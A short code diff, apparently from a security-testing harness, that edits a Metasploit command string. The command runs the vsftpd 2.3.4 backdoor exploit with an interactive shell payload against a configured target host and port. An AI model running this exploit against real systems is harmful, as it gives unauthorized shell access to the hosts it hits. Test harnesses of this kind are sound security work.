@@ -134,7 +134,7 @@ def build_tool_command(tool_id: str, target_id: str, profile_id: str) -> ToolCom
             "use exploit/unix/ftp/vsftpd_234_backdoor; "
             "set TARGET 1; set PAYLOAD cmd/unix/interact; "
             f"set RHOSTS {target.host}; set RPORT {target.port}; "
-            "set WfsDelay 1; exploit -j; sleep 2; sessions -K; exit -y"
+            "set WfsDelay 1; exploit -z; sessions -K; exit -y"
         )
         # Target and module are fixed; the derived image clears Rapid7's
         # writable account-setup entrypoint and runs this command directly.
